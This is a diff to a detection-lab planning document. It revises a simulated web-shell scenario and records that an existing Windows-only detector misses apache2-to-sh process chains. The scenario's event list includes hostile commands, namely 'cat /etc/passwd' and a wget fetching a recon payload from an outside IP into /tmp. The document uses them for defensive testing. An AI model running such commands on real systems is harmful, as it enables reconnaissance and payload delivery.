@@ -75,9 +75,9 @@ Every scenario lives at `labs/simulator/scenarios/<name>.py`, follows the `crede
 4. `process.created` host-web — apache2→sh→`cat /etc/passwd`.
 5. `process.created` host-web — apache2→sh→`wget http://203.0.113.42/recon -O /tmp/recon`.
 
-**Acceptance (best case):** `py.process.suspicious_child` fires on apache→sh chains. **Correlator:** `endpoint_compromise_standalone` (host-web).
+**Acceptance (must_fire):** `[]` (none — see "Confirmed gap"). **must_not_fire:** all four current detectors. **Correlator:** none in current platform state; Phase 22 LotL detector for apache2→sh chains would promote A3 to `endpoint_compromise_standalone`.
 
-**Likely gap (record, do not fix):** the existing `suspicious_child` detector is calibrated for sshd→bash chains — `apache2→sh` may not match the parent allow-list (verify by reading `backend/app/detection/rules/process_suspicious_child.py` during execution). If the gap is real, the manifest entry's `must_fire` list omits `py.process.suspicious_child` and the gap is logged as a Phase 22 input. **Per the no-new-detectors guardrail, do NOT extend the rule in Phase 20.**
+**Confirmed gap (corrected from earlier draft — same root cause as §A1):** `process_suspicious_child` (`backend/app/detection/rules/process_suspicious_child.py:14-25`) has three branches — encoded PowerShell, Office→shell, rundll32+script — all Windows-only. The earlier draft claimed it was "calibrated for sshd→bash chains" which is also wrong (no Linux branch exists at all). `apache2→sh` doesn't match. No auth events; no pre-blocked observables. A3 produces no incident. The recurring "no Linux process-chain detector" gap (now confirmed in A1+A2+A3) is the strongest single Phase 22 input. **Per the no-new-detectors guardrail, do NOT extend the rule in Phase 20.**
 
 **Expected ATT&CK:** T1505.003, T1059.004, T1083.
 
